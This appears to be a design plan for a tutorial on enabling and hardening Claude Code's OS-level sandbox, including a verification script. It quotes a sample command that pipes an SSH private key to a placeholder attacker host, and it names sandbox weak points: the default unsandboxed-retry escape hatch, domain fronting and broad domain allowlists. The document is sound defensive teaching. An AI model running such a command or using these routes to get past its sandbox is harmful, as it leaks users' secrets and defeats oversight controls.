# Scenario 01: Native Sandbox Basics

## Goal
Walk a user from "sandbox? what sandbox?" to "sandbox is on, I've verified it works, and I understand what it does and doesn't protect." Progressive — start minimal, layer understanding.

## Approach

### README structure (progressive)

**Part 1: What This Does**
- One paragraph: Claude Code has an OS-level sandbox that restricts what Bash commands can touch (files and network). It uses Seatbelt on macOS, bubblewrap on Linux/WSL2.
- Key mental model: the sandbox wraps Bash commands and all their child processes. It does NOT wrap Claude's Read/Edit/WebFetch tools (those are covered by the permissions system).

**Part 2: Why It Matters**
- Without sandbox: a prompt injection or malicious dependency can `cat ~/.ssh/id_rsa | curl attacker.com` — the permissions prompt is your only defense, and approval fatigue is real.
- With sandbox: that command fails at the OS level regardless of what Claude or the user approves.

**Part 3: Quick Start**
```bash
cd scenarios/01-native-sandbox-basics
claude                # opens Claude Code — sandbox is active via .claude/settings.json
./verify.sh           # proves the sandbox is working (run in a separate terminal)
```
Three lines. That's it. The rest of the README explains what's happening and why.

**Part 4: Prerequisites**
- macOS: nothing (Seatbelt is built in)
- Linux/WSL2: `sudo apt-get install bubblewrap socat` (or dnf equivalent)
- WSL1: not supported
- Windows: not supported

**Part 5: Enable It (Step 1 — minimal)**
- Quickest path: run `/sandbox` in the REPL, pick auto-allow mode
- Manual path: add `{"sandbox": {"enabled": true}}` to settings.json
- Explain: this gives you auto-allow mode by default (`autoAllowBashIfSandboxed: true`), meaning sandboxed commands run without per-command prompts

**Part 6: Close the Escape Hatch (Step 2)**
- Explain: by default, `allowUnsandboxedCommands` is `true` — if a command fails due to sandbox restrictions, Claude can retry it OUTSIDE the sandbox (still goes through permissions, but the sandbox protection is gone)
- Add `"allowUnsandboxedCommands": false` to lock it down
- This is the single most important hardening step after enabling the sandbox

**Part 7: Verify It Works**
- Reference verify.sh
- Walk through what each check does and what to expect

**Part 8: Gotchas**
- Escape hatch is on by default (Step 2 addresses this)
- Read/Edit tools are NOT sandboxed — only Bash
- `docker` is incompatible with sandbox — needs `excludedCommands`
- `watchman` (used by jest) is incompatible — use `jest --no-watchman`
- Domain fronting can bypass network filtering
- Allowing broad domains like `github.com` can enable exfiltration

**Part 9: Next Steps**
- Scenario 02 (filesystem controls) for fine-grained path rules
- Scenario 03 (network isolation) for domain allowlisting

### File structure
```
scenarios/01-native-sandbox-basics/
  README.md
  .claude/
    settings.json        # hardened version (recommended config)
  verify.sh              # uses npx @anthropic-ai/sandbox-runtime
```

### .claude/settings.json
Ship two versions in the README (progressive), one file on disk:
- **Minimal** (Step 1): just `{"sandbox": {"enabled": true}}`
- **Hardened** (Step 2): adds `"allowUnsandboxedCommands": false` + minimal network allowlist (`api.anthropic.com` only)
- The actual `.claude/settings.json` file ships the hardened version (the one we recommend)
- Lives in `.claude/` subdirectory to mirror real project structure — scenarios are self-contained, copy-paste ready

The minimal network allowlist (just `api.anthropic.com`) is included so verify.sh can demonstrate network isolation working. Scenario 03 covers domain allowlisting in depth.

### verify.sh
Uses `npx @anthropic-ai/sandbox-runtime` to run checks inside Claude's actual sandbox — tests what Claude's sandbox really does, not a simulation.

Checks:
1. Confirm sandbox runtime is available (install prompt if not)
2. Attempt to write outside cwd — should fail
3. Attempt to read a denied path (if configured) — should fail
4. Attempt outbound network to a non-allowed domain — should fail
5. Attempt a normal operation within cwd — should succeed (prove it's not broken)

Output: verbose — each check explains what it's testing and why before showing pass/fail. The script itself is educational, not just functional.

### README details
- Seatbelt/bubblewrap get one sentence each explaining what they are, plus links to documentation
- Example: "Seatbelt is macOS's built-in process sandboxing framework — the same tech that isolates App Store apps. Bubblewrap creates unprivileged Linux containers using user namespaces."

## Decisions
- **Two-step progressive approach** (enable → harden) rather than dumping the full config up front. Lets the reader understand what each setting does.
- **Ship the hardened settings.json as the file**, not the minimal one. The README walks through both, but the artifact is the recommended config.
- **verify.sh uses `npx @anthropic-ai/sandbox-runtime`** — tests the real sandbox, not a simulation. Adds npm as a dependency but proves exactly what matters.
- **Include a minimal network allowlist** (`api.anthropic.com` only) so network isolation is demonstrable in this scenario. Scenario 03 goes deep on domain configuration.
- **Settings.json lives in `.claude/` subdirectory** — mirrors real project structure, scenarios are self-contained and copy-paste ready.
- **Brief Seatbelt/bubblewrap explanations** — one sentence each, link to docs. Build intuition without derailing.

## Open Questions
*(none — plan is ready for implementation)*

## Out of Scope
- Filesystem path customization (that's scenario 02)
- Network domain allowlisting details (that's scenario 03)
- Permissions system configuration (that's scenario 04)
- Docker/container isolation (scenarios 06-09)

## Deferred
*(none)*
